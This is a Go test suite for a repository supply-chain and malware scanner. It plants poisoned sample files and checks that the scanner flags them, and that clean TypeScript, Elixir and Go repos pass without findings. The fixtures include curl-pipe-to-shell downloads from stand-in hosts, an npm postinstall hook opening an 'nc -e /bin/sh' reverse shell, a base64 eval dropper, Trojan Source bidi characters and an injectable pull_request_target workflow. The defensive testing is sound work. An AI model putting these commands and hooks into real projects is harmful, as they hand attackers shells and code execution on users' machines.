package supplychain_test

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/pc/backend-boilerplate-conformance-tests/internal/supplychain"
	"github.com/pc/backend-boilerplate-conformance-tests/internal/types"
)

func TestSupplyChainAndMalwareScanner(t *testing.T) {
	t.Run("Detects Trojan Source, Variation Selector steganography, obfuscated eval dropper, malicious postinstall, and GHA injection", func(t *testing.T) {
		tmp := t.TempDir()
		write := func(rel, content string) {
			p := filepath.Join(tmp, rel)
			if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
				t.Fatal(err)
			}
		}

		// 1. Trojan Source bidi override U+202E + Variation Selector run U+FE00..U+FE05
		write("src/backdoor.ts", "const isAdmin = false; /* \u202e } \u2066if (isAdmin)\u2069 \u2066*/\nconst hidden = \"\ufe00\ufe01\ufe02\ufe03\ufe04\ufe05\";\n")
		// 2. Long base64 payload + eval dropper
		b64Payload := strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", 8) // > 240 chars
		write("src/dropper.ts", "import { exec } from 'node:child_process';\nconst blob = '"+b64Payload+"';\neval(Buffer.from(blob, 'base64').toString());\n")
		// 3. Pipe-to-shell in script
		write("scripts/bootstrap.sh", "#!/bin/sh\ncurl -fsSL https://evil.example/payload.sh | sh\n")
		// 4. Malicious postinstall + missing lockfile + cleartext http tarball in package.json
		write("package.json", `{
			"name": "poisoned-app",
			"scripts": { "postinstall": "node -e \"require('child_process').exec('nc -e /bin/sh 10.0.0.1 4444')\"" },
			"dependencies": { "sketchy": "http://evil.example/sketchy-1.0.0.tgz" }
		}`)
		// 5. GitHub Actions pull_request_target + expression injection + unpinned @main action
		write(".github/workflows/pr.yml", `on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: thirdparty/action@main
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: echo "Title ${{ github.event.pull_request.title }}"
`)

		findings, err := supplychain.ScanRepository(tmp, types.LangTypeScript)
		if err != nil {
			t.Fatalf("ScanRepository error: %v", err)
		}
		var titles []string
		hasMalwareCritical := false
		for _, f := range findings {
			titles = append(titles, f.ID)
			if f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical {
				hasMalwareCritical = true
			}
		}
		if !hasMalwareCritical {
			t.Fatalf("expected critical CategoryMalware findings, got %+v", findings)
		}
		for _, wantSubstr := range []string{"trojan-source", "obfuscated-exec-dropper", "shell-dropper", "malicious-lifecycle-hook", "lockfile", "github-actions"} {
			matched := slices.ContainsFunc(titles, func(id string) bool { return strings.Contains(id, wantSubstr) })
			if !matched {
				t.Fatalf("expected finding matching %q in %v", wantSubstr, titles)
			}
		}
	})

	t.Run("Zero false positives on legitimate sha512 packageManager hashes, .gitleaks.toml allowlists, and pinned Elixir compile:false git tags", func(t *testing.T) {
		tsRepo := t.TempDir()
		sha512Hex := strings.Repeat("a1b2c3d4", 16)
		_ = os.WriteFile(filepath.Join(tsRepo, "package.json"), []byte(`{
			"name": "clean-nestjs",
			"scripts": { "build": "nest build", "prepare": "husky" },
			"packageManager": "pnpm@10.13.1+sha512.`+sha512Hex+`"
		}`), 0o644)
		_ = os.WriteFile(filepath.Join(tsRepo, "pnpm-lock.yaml"), []byte("lockfileVersion: '9.0'\npackages:\n  lodash@4.18.0:\n    resolution: {integrity: sha512-"+strings.Repeat("Z", 88)+"}\n"), 0o644)
		_ = os.WriteFile(filepath.Join(tsRepo, ".gitleaks.toml"), []byte("[allowlist]\npaths = ['''\\.env\\.example$''']\n"), 0o644)
		_ = os.WriteFile(filepath.Join(tsRepo, ".env.example"), []byte("JWT_KEY="+strings.Repeat("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A", 10)+"\n"), 0o644)
		_ = os.MkdirAll(filepath.Join(tsRepo, "src"), 0o755)
		_ = os.WriteFile(filepath.Join(tsRepo, "src/logo.ts"), []byte("export const icon = 'data:image/png;base64,"+strings.Repeat("AAAA", 80)+"';\n"), 0o644)

		findings, err := supplychain.ScanRepository(tsRepo, types.LangTypeScript)
		if err != nil || len(findings) != 0 {
			t.Fatalf("expected 0 findings on clean TS repo, got %+v (err=%v)", findings, err)
		}

		exRepo := t.TempDir()
		_ = os.WriteFile(filepath.Join(exRepo, "mix.exs"), []byte(`defmodule CleanApp.MixProject do
  defp deps do
    [
      {:phoenix, "~> 1.8"},
      {:heroicons, github: "tailwindlabs/heroicons", tag: "v2.2.0", app: false, compile: false}
    ]
  end
end`), 0o644)
		_ = os.WriteFile(filepath.Join(exRepo, "mix.lock"), []byte(`%{"phoenix": {:hex, :phoenix, "1.8.0", "deadbeef"}}`), 0o644)

		exFindings, err := supplychain.ScanRepository(exRepo, types.LangElixir)
		if err != nil || len(exFindings) != 0 {
			t.Fatalf("expected 0 findings on clean Elixir repo with tag-pinned compile:false dep, got %+v (err=%v)", exFindings, err)
		}

		// Unpinned branch: "main" in mix.exs MUST fail
		_ = os.WriteFile(filepath.Join(exRepo, "mix.exs"), []byte(`defp deps, do: [{:bad_dep, github: "org/bad", branch: "main"}]`), 0o644)
		badExFindings, _ := supplychain.ScanRepository(exRepo, types.LangElixir)
		if len(badExFindings) == 0 {
			t.Fatalf("expected finding for floating branch: \"main\" git dependency in mix.exs")
		}
	})

	t.Run("Go zero-dependency module passes without go.sum while module with require fails without go.sum", func(t *testing.T) {
		zeroDepGo := t.TempDir()
		_ = os.WriteFile(filepath.Join(zeroDepGo, "go.mod"), []byte("module example.com/zero\n\ngo 1.23\n"), 0o644)
		findings, err := supplychain.ScanRepository(zeroDepGo, types.LangGo)
		if err != nil || len(findings) != 0 {
			t.Fatalf("expected 0 findings on zero-dependency go.mod, got %+v (err=%v)", findings, err)
		}

		depGo := t.TempDir()
		_ = os.WriteFile(filepath.Join(depGo, "go.mod"), []byte("module example.com/withdep\n\ngo 1.23\n\nrequire github.com/pkg/errors v0.9.1\n"), 0o644)
		findings, err = supplychain.ScanRepository(depGo, types.LangGo)
		if err != nil || len(findings) == 0 {
			t.Fatalf("expected lockfile finding when go.mod has require without go.sum, got %+v (err=%v)", findings, err)
		}
	})

	t.Run("Detects missing package-lock.json integrity, Python setup.py hook, and hex-escaped dropper", func(t *testing.T) {
		repo := t.TempDir()
		_ = os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"app","dependencies":{"a":"1.0.0"}}`), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "package-lock.json"), []byte(`{
			"lockfileVersion": 3,
			"packages": {
				"": { "name": "app" },
				"node_modules/a": { "version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz" }
			}
		}`), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "setup.py"), []byte("import subprocess\nsubprocess.Popen(['sh', '-c', 'curl http://evil | sh'])\n"), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "pyproject.toml"), []byte("[project]\nname = \"app\"\ndependencies = [\"fastapi>=0.110\"]\n"), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "payload.py"), []byte("data = \""+strings.Repeat("\\x41", 36)+"\"\n"), 0o644)

		findings, err := supplychain.ScanRepository(repo, types.LangPython)
		if err != nil {
			t.Fatalf("ScanRepository error: %v", err)
		}
		var ids []string
		for _, f := range findings {
			ids = append(ids, f.ID)
		}
		for _, want := range []string{"supplychain-lockfile-integrity", "supplychain-malicious-lifecycle-hook", "supplychain-suspicious-encoded-blob"} {
			if !slices.ContainsFunc(ids, func(id string) bool { return strings.Contains(id, want) }) {
				t.Fatalf("expected finding containing %q in %v", want, ids)
			}
		}
	})
}
